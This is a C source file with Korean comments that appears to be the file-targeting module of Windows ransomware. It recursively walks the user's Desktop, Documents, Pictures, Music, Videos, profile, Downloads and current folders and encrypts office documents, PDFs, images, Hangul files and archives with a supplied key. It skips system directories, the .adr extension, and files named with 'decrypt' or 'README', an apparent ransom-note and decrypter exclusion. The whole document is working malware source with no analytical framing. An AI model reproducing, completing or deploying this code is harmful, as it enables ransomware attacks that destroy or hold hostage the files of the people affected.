// encryptor_walker.c
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <string.h>
#include <initguid.h>
#include <knownfolders.h>
#include "encryptor.h"
#include "walker.h"

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shlwapi.lib")

// 암호화 대상 확장자 리스트
const char* extList[] = {
    ".txt", ".docx", ".xlsx", ".pdf", ".jpg", ".png", ".hwp", ".zip", ".pptx"
};

// 암호화 대상 파일인지 판단 (확장자 비교)
int is_target_file(const char* filename) {
    const char* ext = strrchr(filename, '.');
    if (!ext) return 0;
    for (int i = 0; i < sizeof(extList) / sizeof(extList[0]); i++) {
        if (_stricmp(ext, extList[i]) == 0) return 1;
    }
    return 0;
}

// 암호화 제외 대상인지 판단 (.adr, decrypt 포함 여부)
int should_skip_file(const char* filename) {
    if (StrStrIA(filename, ".adr")) return 1;
    if (StrStrIA(filename, "decrypt") || StrStrIA(filename, "README")) return 1;
    return 0;
}

// 시스템 경로 여부 확인
int is_system_path(const char* path) {
    return (
        StrStrIA(path, "\\Windows\\") ||
        StrStrIA(path, "\\Program Files") ||
        StrStrIA(path, "\\AppData\\")
        );
}

// 지정된 디렉토리 내 재귀적 암호화 수행
void scan_and_encrypt(const char* dir, const unsigned char* key, const unsigned char* iv) {
    if (is_system_path(dir)) return;

    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, MAX_PATH, "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_and_encrypt(fullpath, key, iv);
        }
        else {
            if (should_skip_file(fd.cFileName)) {
                continue;
            }
            if (is_target_file(fd.cFileName)) {
                encrypt_file(fullpath, key, iv);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

// 주요 사용자 폴더 및 현재 폴더 암호화 수행
void encrypt_all_targets(const unsigned char* key, const unsigned char* iv) {
    const int folders[] = {
        CSIDL_DESKTOP, CSIDL_PERSONAL, CSIDL_MYPICTURES,
        CSIDL_MYMUSIC, CSIDL_MYVIDEO, CSIDL_PROFILE
    };

    char path[MAX_PATH];
    for (int i = 0; i < sizeof(folders) / sizeof(folders[0]); i++) {
        if (SHGetFolderPathA(NULL, folders[i], NULL, 0, path) == S_OK) {
            scan_and_encrypt(path, key, iv);
        }
    }

    // Downloads 폴더 암호화
    PWSTR wpath = NULL;
    if (SHGetKnownFolderPath(&FOLDERID_Downloads, 0, NULL, &wpath) == S_OK) {
        wcstombs(path, wpath, MAX_PATH);
        scan_and_encrypt(path, key, iv);
        CoTaskMemFree(wpath);
    }

    // 현재 폴더 암호화
    GetCurrentDirectoryA(MAX_PATH, path);
    scan_and_encrypt(path, key, iv);
}
